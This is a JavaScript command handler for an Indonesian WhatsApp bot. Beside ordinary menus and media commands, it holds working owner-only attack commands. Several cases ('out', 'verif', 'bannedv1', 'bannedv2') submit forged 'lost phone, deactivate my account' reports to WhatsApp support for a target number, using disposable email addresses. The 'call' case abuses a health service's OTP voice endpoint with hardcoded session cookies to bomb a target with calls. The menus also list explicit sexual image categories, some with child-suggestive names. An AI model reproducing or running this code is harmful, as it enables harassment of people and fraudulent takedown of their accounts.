module.exports = async (basenewkirbotz, m, store) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isGroup = from.endsWith('@g.us')
const botNumber = await basenewkirbotz.decodeJid(basenewkirbotz.user.id)
const sender = m.key.fromMe ? (basenewkirbotz.user.id.split(':')[0]+'@s.whatsapp.net' || basenewkirbotz.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup? await basenewkirbotz.groupMetadata(m.chat).catch(e => {}) : ""
const groupName = isGroup? groupMetadata.subject : ""
const groupOwner = isGroup? groupMetadata.owner : ""
const pwkdnwn = isGroup? await groupMetadata.participants : ""
const groupAdmins = isGroup? await pwkdnwn.filter(v => v.admin !== null).map(v => v.id) : ""
const groupMembers = isGroup? groupMetadata.participants : ""
const isGroupAdmins = isGroup? groupAdmins.includes(m.sender) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false
const isMedia = /image|video|sticker|audio/.test(mime)
const isImage = (m.type == 'imageMessage')
const reply = (teks) => { basenewkirbotz.sendMessage(from, { text: teks, contextInfo:{ forwardingScore: 9999, isForwarded: true }}, { quoted: m }) }

// Auto Blocked Nomor +212
if (m.sender.startsWith('212')) return basenewkirbotz.updateBlockStatus(m.sender, 'block')

// Random Color
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]

// Command Yang Muncul Di Console
if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namabot), color(`[ PESAN ]`, `${randomcolor}`), color(`FROM`, `${randomcolor}`), color(`${pushname}`, `${randomcolor}`), color(`Text :`, `${randomcolor}`), color(`${body}`, `white`))
}

// Database
const ownerNumber = JSON.parse(fs.readFileSync("./all/database/owner.json"))
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))

// Get Database
const isContacts = contacts.includes(sender)
const isOwner = owner.includes(senderNumber) || isBot

// Jangan Di Ubah Tar Error
try {
ppuser = await basenewkirbotz.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
try {
ppgroup = await basenewkirbotz.profilePictureUrl(m.chat, 'image')
} catch {
ppgroup = 'https://i.ibb.co/s2KvYYf/20230524-060103.png'
}

// Jangan Di Ubah
let list = []
for (let i of ownerNumber) {
list.push({
displayName: await basenewkirbotz.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await basenewkirbotz.getName(i + '@s.whatsapp.net')}\n
FN:${await basenewkirbotz.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:tesheroku123@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://bit.ly/39Ivus6\n
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

const isUrl = (url) => {
return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
}

if (m.isGroup && !m.key.fromMe && !isOwner && antilink) {
if (!isBotAdmins) return
if (budy.includes("chat.whatsapp.com")) {
setTimeout(() => {
basenewkirbotz.sendMessage(from, { text:`\`\`\`「 Detect Link 」\`\`\`\n\n@${sender.split("@")[0]} Maaf Link Yang Kamu Kirim Di Dalam Group Ini Akan Di Hapus Oleh Bot`, mentions: [sender]}, { quoted: m })
}, 1000)
setTimeout(() => {
basenewkirbotz.sendMessage(from, { delete: m.key })
}, 2000)
}
}

switch (command) {
case "menu": {
const dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
const owned = owner + "@s.whatsapp.net"
const txt99 = `Hai Kak @${sender.split("@")[0]}, ${ucapanWaktu}

━═━═❏ *INFO - BOT* ❏═━═━
Nama Creator : *${namabot}*
Nomor Creator : *@${owned.split("@")[0]}*
Runtime Bot : *${runtime(process.uptime())}*
Pengguna : *${isOwner ? `Owner Bot` : `User Bot`}*
Mode Bot : *${basenewkirbotz.public ? `Public Mode` : `Self Mode`}*
━一一一一一一一一一一━

┌═⟬ *LIST MENU* ⟭
│ ◦ ${prefix}jadibotmenu ( *Tinggal Scan* )
│ ◦ ${prefix}usermenu ( *Khusus User* )
│ ◦ ${prefix}asupanmenu ( *Random Video* )
│ ◦ ${prefix}bannedmenu ( *Khusus Owner* )
│ ◦ ${prefix}textpromenu ( *Text Image* )
│ ◦ ${prefix}photooxymenu ( *Text Image* )
│ ◦ ${prefix}searchmenu ( *Searching* )
│ ◦ ${prefix}randomimage ( *Random Foto* )
│ ◦ ${prefix}randomsticker ( *Random Sticker* )
│ ◦ ${prefix}ramdomtext ( *Random Text* )
│ ◦ ${prefix}pushkonmenu ( *Push Kontak* )
│ ◦ ${prefix}groupmenu ( *Group Settings* )
╰──────────────━`
basenewkirbotz.sendMessage(from, { text: txt99,
contextInfo:{ "mentionedJid": [sender, owned], "externalAdReply": { "showAdAttribution": true, "renderLargerThumbnail": true, "title": "Youtube KirBotz`", "containsAutoReply": true, "mediaType": 1, "thumbnail": thumb, "mediaUrl": 'https://youtu.be/4qgzi6G62B0', "sourceUrl": 'https://youtu.be/4qgzi6G62B0' } }
}, { quoted: m })
}
break
case "usermenu": {
const y1 = `╭┅═⟬ *USER MENU* ⟭
┆○ ${prefix}donasi
┆○ ${prefix}payment
┆○ ${prefix}owner
┆○ ${prefix}remini
┆○ ${prefix}toptv
┆○ ${prefix}tourl
┆○ ${prefix}halah
┆○ ${prefix}hilih
┆○ ${prefix}huluh
┆○ ${prefix}heleh
┆○ ${prefix}holoh
┆○ ${prefix}tohuruf
┆○ ${prefix}styletext
┆○ ${prefix}sticker
┆○ ${prefix}ssweb
┆○ ${prefix}smeme
┆○ ${prefix}bass
┆○ ${prefix}blown
┆○ ${prefix}deep
┆○ ${prefix}earrape
┆○ ${prefix}fast
┆○ ${prefix}fat
┆○ ${prefix}nightcore
┆○ ${prefix}reverse
┆○ ${prefix}robot
┆○ ${prefix}slow
┆○ ${prefix}smooth
┆○ ${prefix}tupai
┆○ ${prefix}ebinary
┆○ ${prefix}dbinary
╰──────────────━`
reply(y1)
}
break
case "randomimage": {
const y2 = `╭┅═⟬ *RANDOM IMAGE* ⟭
┆○ ${prefix}china
┆○ ${prefix}indonesia
┆○ ${prefix}japan
┆○ ${prefix}korea
┆○ ${prefix}malaysia
┆○ ${prefix}thailand
┆○ ${prefix}vietnam
┆○ ${prefix}aesthetic
┆○ ${prefix}ahegao
┆○ ${prefix}akira
┆○ ${prefix}akiyama
┆○ ${prefix}ana
┆○ ${prefix}anjing
┆○ ${prefix}art2
┆○ ${prefix}ass
┆○ ${prefix}asuna
┆○ ${prefix}ayuzawa
┆○ ${prefix}bdsm
┆○ ${prefix}boneka
┆○ ${prefix}boruto
┆○ ${prefix}bts
┆○ ${prefix}cecan2
┆○ ${prefix}chiho
┆○ ${prefix}chitoge
┆○ ${prefix}cogan2
┆○ ${prefix}cosplay
┆○ ${prefix}cosplayloli
┆○ ${prefix}cosplaysagiri
┆○ ${prefix}cuckold
┆○ ${prefix}cum
┆○ ${prefix}cyber
┆○ ${prefix}darkjokes
┆○ ${prefix}deidara
┆○ ${prefix}doraemon
┆○ ${prefix}eba
┆○ ${prefix}elaina
┆○ ${prefix}emilia
┆○ ${prefix}ero
┆○ ${prefix}erza
┆○ ${prefix}exo
┆○ ${prefix}femdom
┆○ ${prefix}foot
┆○ ${prefix}freefire
┆○ ${prefix}gamewallpaper
┆○ ${prefix}gangbang
┆○ ${prefix}glasses
┆○ ${prefix}gremory
┆○ ${prefix}hekel
┆○ ${prefix}hentai
┆○ ${prefix}hestia
┆○ ${prefix}hijaber
┆○ ${prefix}hinata
┆○ ${prefix}husbu
┆○ ${prefix}inori
┆○ ${prefix}islamic
┆○ ${prefix}isuzu
┆○ ${prefix}itachi
┆○ ${prefix}itori
┆○ ${prefix}jahy
┆○ ${prefix}jeni
┆○ ${prefix}jiso
┆○ ${prefix}justina
┆○ ${prefix}kaga
┆○ ${prefix}kagura
┆○ ${prefix}kakasih
┆○ ${prefix}kaori
┆○ ${prefix}kartun
┆○ ${prefix}katakata
┆○ ${prefix}keneki
┆○ ${prefix}kotori
┆○ ${prefix}kpop
┆○ ${prefix}kucing
┆○ ${prefix}kurumi
┆○ ${prefix}lisa
┆○ ${prefix}loli
┆○ ${prefix}madara
┆○ ${prefix}masturbation
┆○ ${prefix}megumin
┆○ ${prefix}mikasa
┆○ ${prefix}mikey
┆○ ${prefix}miku
┆○ ${prefix}milf
┆○ ${prefix}minato
┆○ ${prefix}mobil
┆○ ${prefix}motor
┆○ ${prefix}mountain
┆○ ${prefix}naruto
┆○ ${prefix}neko1
┆○ ${prefix}neko2
┆○ ${prefix}nekonime
┆○ ${prefix}nezuko
┆○ ${prefix}onepiece
┆○ ${prefix}orgy
┆○ ${prefix}panties
┆○ ${prefix}pentol
┆○ ${prefix}pokemon
┆○ ${prefix}profil
┆○ ${prefix}programming
┆○ ${prefix}pubg
┆○ ${prefix}pussy
┆○ ${prefix}quotesyt
┆○ ${prefix}randblackpink
┆○ ${prefix}randomnime
┆○ ${prefix}randomnime2
┆○ ${prefix}rize
┆○ ${prefix}rose
┆○ ${prefix}ryujin
┆○ ${prefix}sagiri
┆○ ${prefix}sakura
┆○ ${prefix}sasuke
┆○ ${prefix}satanic
┆○ ${prefix}shina
┆○ ${prefix}shinka
┆○ ${prefix}shinomiya
┆○ ${prefix}shizuka
┆○ ${prefix}shota
┆○ ${prefix}tatasurya
┆○ ${prefix}technology
┆○ ${prefix}tejina
┆○ ${prefix}tentacles
┆○ ${prefix}thighs
┆○ ${prefix}toukachan
┆○ ${prefix}tsunade
┆○ ${prefix}waifu2
┆○ ${prefix}wallhp
┆○ ${prefix}wallml
┆○ ${prefix}wallnime2
┆○ ${prefix}yotsuba
┆○ ${prefix}yuki
┆○ ${prefix}yulibocil
┆○ ${prefix}yumeko
┆○ ${prefix}ppcouple
╰──────────────━`
reply(y2)
}
break
case "randomsticker": {
const y3 = `╭┅═⟬ *RANDOM STICKER* ⟭
┆○ ${prefix}cry
┆○ ${prefix}kill
┆○ ${prefix}hug
┆○ ${prefix}pat
┆○ ${prefix}lick
┆○ ${prefix}kiss
┆○ ${prefix}bite
┆○ ${prefix}yeet
┆○ ${prefix}bully
┆○ ${prefix}bonk
┆○ ${prefix}wink
┆○ ${prefix}poke
┆○ ${prefix}nom
┆○ ${prefix}slap
┆○ ${prefix}smile
┆○ ${prefix}wave
┆○ ${prefix}awoo
┆○ ${prefix}blush
┆○ ${prefix}smug
┆○ ${prefix}glomp
┆○ ${prefix}happy
┆○ ${prefix}dance
┆○ ${prefix}cringe
┆○ ${prefix}cuddle
┆○ ${prefix}highfive
┆○ ${prefix}handhold
╰──────────────━`
reply(y3)
}
break
case "bannedmenu": {
const y4 = `╭┅═⟬ *BANNED MENU* ⟭
┆○ ${prefix}call _nomor_
┆○ ${prefix}out _nomor_
┆○ ${prefix}verif _nomor_
┆○ ${prefix}bannedv1 _nomor_
┆○ ${prefix}bannedv2 _nomor_
┆○ ${prefix}bannedv3 _nomor_
┆○ ${prefix}bannedv4 _nomor_
┆○ ${prefix}bannedv5 _nomor_
┆○ ${prefix}bannedv6 _nomor_
┆○ ${prefix}unbannedv1 _nomor_
┆○ ${prefix}unbannedv2 _nomor_
┆○ ${prefix}unbannedv3 _nomor_
┆○ ${prefix}unbannedv4 _nomor_
┆○ ${prefix}unbannedv5 _nomor_
╰──────────────━

*Note : Awali Dengan +62 Lanjutkan Sesuai Nomor Target*`
reply(y4)
}
break
case "photooxymenu": {
const y5 = `╭┅═⟬ *PHOTOOXY MENU* ⟭
┆○ ${prefix}shadow
┆○ ${prefix}write
┆○ ${prefix}romantic
┆○ ${prefix}burnpaper
┆○ ${prefix}smoke
┆○ ${prefix}narutobanner
┆○ ${prefix}love
┆○ ${prefix}undergrass
┆○ ${prefix}doublelove
┆○ ${prefix}coffecup
┆○ ${prefix}underwaterocean
┆○ ${prefix}smokyneon
┆○ ${prefix}starstext
┆○ ${prefix}rainboweffect
┆○ ${prefix}balloontext
┆○ ${prefix}metalliceffect
┆○ ${prefix}embroiderytext
┆○ ${prefix}flamingtext
┆○ ${prefix}stonetext
┆○ ${prefix}writeart
┆○ ${prefix}summertext
┆○ ${prefix}wolfmetaltext
┆○ ${prefix}nature3dtext
┆○ ${prefix}rosestext
┆○ ${prefix}naturetypography
┆○ ${prefix}quotesunder
┆○ ${prefix}shinetext
╰──────────────━`
reply(y5)
}
break
case "textpromenu": {
const y6 = `╭┅═⟬ *TEXTPRO MENU* ⟭
┆○ ${prefix}candy
┆○ ${prefix}christmas
┆○ ${prefix}3dchristmas
┆○ ${prefix}sparklechristmas
┆○ ${prefix}deepsea
┆○ ${prefix}scifi
┆○ ${prefix}rainbow
┆○ ${prefix}waterpipe
┆○ ${prefix}spooky
┆○ ${prefix}pencil
┆○ ${prefix}circuit
┆○ ${prefix}discovery
┆○ ${prefix}fiction
┆○ ${prefix}demon
┆○ ${prefix}transformer
┆○ ${prefix}berry
┆○ ${prefix}thunder
┆○ ${prefix}magma
┆○ ${prefix}3dstone
┆○ ${prefix}neonlight
┆○ ${prefix}glitch
┆○ ${prefix}harrypotter
┆○ ${prefix}brokenglass
┆○ ${prefix}papercut
┆○ ${prefix}watercolor
┆○ ${prefix}multicolor
┆○ ${prefix}neondevil
┆○ ${prefix}underwater
┆○ ${prefix}graffitibike
┆○ ${prefix}snow
┆○ ${prefix}cloud
┆○ ${prefix}honey
┆○ ${prefix}ice
┆○ ${prefix}fruitjuice
┆○ ${prefix}biscuit
┆○ ${prefix}wood
┆○ ${prefix}chocolate
┆○ ${prefix}strawberry
┆○ ${prefix}matrix
┆○ ${prefix}blood
┆○ ${prefix}dropwater
┆○ ${prefix}toxic
┆○ ${prefix}lava
┆○ ${prefix}rock
┆○ ${prefix}bloodglas
┆○ ${prefix}hallowen
┆○ ${prefix}darkgold
┆○ ${prefix}joker
┆○ ${prefix}wicker
┆○ ${prefix}firework
┆○ ${prefix}skeleton
┆○ ${prefix}blackpink
┆○ ${prefix}sand
┆○ ${prefix}glue
┆○ ${prefix}1917
┆○ ${prefix}leaves
╰──────────────━`
reply(y6)
}
break
case "asupanmenu": {
const y7 = `╭┅═⟬ *ASUPAN MENU* ⟭
┆○ ${prefix}asupan
┆○ ${prefix}bocil
┆○ ${prefix}geayubi
┆○ ${prefix}kayes
┆○ ${prefix}notnot
┆○ ${prefix}rikagusriani
┆○ ${prefix}santuy
┆○ ${prefix}ukhty
╰──────────────━`
reply(y7)
}
break
case "randomtext": {
const y8 = `╭┅═⟬ *RANDOM TEXT* ⟭
┆○ ${prefix}bucin
┆○ ${prefix}ceritahoror
┆○ ${prefix}dare
┆○ ${prefix}faktaunix
┆○ ${prefix}fml
┆○ ${prefix}katabijak
┆○ ${prefix}katacinta
┆○ ${prefix}katagalau
┆○ ${prefix}katahacker
┆○ ${prefix}katailham
┆○ ${prefix}katasenja
┆○ ${prefix}katasindiran
┆○ ${prefix}motivasi
┆○ ${prefix}nickff
┆○ ${prefix}pantun
┆○ ${prefix}puisi
┆○ ${prefix}quotes
┆○ ${prefix}quotesanime
┆○ ${prefix}quotesislamic
┆○ ${prefix}quotespubg
┆○ ${prefix}truth
╰──────────────━`
reply(y8)
}
break
case "searchmenu": {
const y9 = `╭┅═⟬ *RANDOM TEXT* ⟭
┆○ ${prefix}happymodsearch _Minecraft_
┆○ ${prefix}stickersearch _loli_
┆○ ${prefix}cariresep _ayam geprek_
┆○ ${prefix}bacaresep _link_
╰──────────────━`
reply(y9)
}
break
case "jadibotmenu": {
const y10 = `╭┅═⟬ *JADIBOT MENU* ⟭
┆○ ${prefix}jadibot
┆○ ${prefix}stopjadibot
┆○ ${prefix}listjadibot
╰──────────────━`
reply(y10)
}
break
case "pushkonmenu": {
const y11 = `╭┅═⟬ *PUSH KONTAK OTOMATIS* ⟭
┆○ ${prefix}cekidgc
┆○ ${prefix}pushkontakv1
┆○ ${prefix}pushkontakv2
┆○ ${prefix}savecontact
╰──────────────━`
reply(y11)
}
break
case "groupmenu": {
const y12 = `╭┅═⟬ *GROUP MENU* ⟭
┆○ ${prefix}revoke
┆○ ${prefix}linkgroup
┆○ ${prefix}infogroup
┆○ ${prefix}antilink _on_
┆○ ${prefix}antilink _off_
┆○ ${prefix}add _nomor_
┆○ ${prefix}kick _nomor_
┆○ ${prefix}group _open_
┆○ ${prefix}group _close_
┆○ ${prefix}tagall _teks_
┆○ ${prefix}hidetag _teks_
┆○ ${prefix}promote _nomor_
┆○ ${prefix}demote _nomor_
┆○ ${prefix}setnamagroup _teks_
┆○ ${prefix}setdescgroup _teks_
╰──────────────━`
reply(y12)
}
break
case "donasi": case "payment": {
owned = `${owner}@s.whatsapp.net`
basenewkirbotz.sendMessage(from, { image: thumbqris, mentions: [owned], caption: `[ PAYMENT ${nameGEDE} ]

QRIS : SCAN QR DI ATAS
OVO : ${ovo}
GOPAY : ${gopay}
SHOPEEPAY : ${shopeepay}
PULSA XL : ${pulsaxl}
PULSA INDOSAT : ${pulsaindosat}

*SS BUKTI TRANSFER, KIRIM KE WHATSAPP @${owned.split("@")[0]} !!*` }, { quoted: m })
}
break
case "owner": {
const repf = await basenewkirbotz.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [sender]
}}, { quoted: m })
basenewkirbotz.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, Nih Owner Ku Jangan Macam-macam Ya`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: repf })
}
break
case "china": case "indonesia": case "japan": case "korea": case "malaysia": case "thailand": case "vietnam":{
reply(mess.wait)
let asu = require(`./all/database/cecan/${command}.json`)
var bykay = asu[Math.floor(Math.random() * asu.length)]
await basenewkirbotz.sendMessage(from, { image: { url : bykay }, caption: mess.success }, { quoted : m })
}
break
case "aesthetic": case "ahegao": case "akira": case "akiyama": case "ana": case "anjing": case "art2": case "ass": case "asuna": case "ayuzawa": case "bdsm": case "boneka": case "boruto": case "bts": case "cecan2": case "chiho": case "chitoge": case "cogan2": case "cosplay": case "cosplayloli": case "cosplaysagiri": case "cuckold": case "cum": case "cyber": case "darkjokes": case "deidara": case "doraemon": case "eba": case "elaina": case "emilia": case "ero": case "erza": case "exo": case "femdom": case "foot": case "freefire": case "gamewallpaper": case "gangbang": case "glasses": case "gremory": case "hekel": case "hentai": case "hestia": case "hijaber": case "hinata": case "husbu": case "inori": case "islamic": case "isuzu": case "itachi": case "itori": case "jahy": case "jeni": case "jiso": case "justina": case "kaga": case "kagura": case "kakasih": case "kaori": case "kartun": case "katakata": case "keneki": case "kotori": case "kpop": case "kucing": case "kurumi": case "lisa": case "loli": case "madara": case "masturbation": case "megumin": case "mikasa": case "mikey": case "miku": case "milf": case "minato": case "mobil": case "motor": case "mountain": case "naruto": case "neko1": case "neko2": case "nekonime": case "nezuko": case "onepiece": case "orgy": case "panties": case "pentol": case "pokemon": case "profil": case "programming": case "pubg": case "pussy": case "quotesyt": case "randblackpink": case "randomnime": case "randomnime2": case "rize": case "rose": case "ryujin": case "sagiri": case "sakura": case "sasuke": case "satanic": case "shina": case "shinka": case "shinomiya": case "shizuka": case "shota": case "tatasurya": case "technology": case "tejina": case "tentacles": case "thighs": case "toukachan": case "tsunade": case "waifu2": case "wallhp": case "wallml": case "wallnime2": case "yotsuba": case "yuki": case "yulibocil": case "yumeko": {
reply(mess.wait)
let asu = require(`./all/database/random/${command}.json`)
var bykay = asu[Math.floor(Math.random() * asu.length)]
await basenewkirbotz.sendMessage(from, { image: { url : bykay }, caption: mess.success }, { quoted : m })
}
break
case "ppcouple": {
let anu = require(`./all/database/random/${command}.json`)
let random = anu[Math.floor(Math.random() * anu.length)]
basenewkirbotz.sendMessage(from, { image: { url: random.male }, caption: `Foto Couple Male` }, { quoted: m })
basenewkirbotz.sendMessage(from, { image: { url: random.female }, caption: `Fofo Couple Female` }, { quoted: m })
}
break
case "halah": case "hilih": case "huluh": case "heleh": case "holoh": {
if (!m.quoted && !text) return reply(`Kirim/Reply Teks Dengan Caption ${prefix + command}`)
ter = command[1].toLowerCase()
tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
}
break
case "styletext":{
if (!q) return reply(`Contoh ${prefix+command} kirbotz`)
reply(mess.wait)
let res = await styletext(q)
reply(util.format(res))
}
break
case "ssweb":{
if (!q) return reply(`Contoh ${prefix+command} link`)
reply(mess.wait)
global.sh = q
let krt = await ssweb(global.sh)
basenewkirbotz.sendMessage(from ,{ image: krt.result, caption: mess.success },{ quoted: m })
}
break
case "smeme": {
if (!q) return reply(`Reply Foto Dengan Caption ${prefix + command} *teks*`)
if (isImage) return reply(`Reply Foto Dengan Caption ${prefix + command} *teks*`)
reply(mess.wait)
mee = await basenewkirbotz.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${q}.png?background=${mem}`)
basenewkirbotz.sendStimg(from, kaytid, m, { packname: global.packname, author: global.author })
}
break
case "cry": case "kill": case "hug": case "pat": case "lick": case "kiss": case "bite": case "yeet": case "bully": case "bonk": case "wink": case "poke": case "nom": case "slap": case "smile": case "wave": case "awoo": case "blush": case "smug": case "glomp": case "happy": case "dance": case "cringe": case "cuddle": case "highfive": case "handhold": {
reply(mess.wait)
axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
basenewkirbotz.sendStimg(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case "call": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} +6285798145596`)
await reply(mess.wait)
let nosend = "+" + q.split("|")[0].replace(/[^0-9]/g, '')
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${nosend}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
}
break
case "out": case "verif":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
let prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await basenewkirbotz.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
basenewkirbotz.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv1": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await basenewkirbotz.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello, please deactivate this number, because I have lost my cellphone and someone is using my number, please deactivate my number")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
basenewkirbotz.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv2": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await basenewkirbotz.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
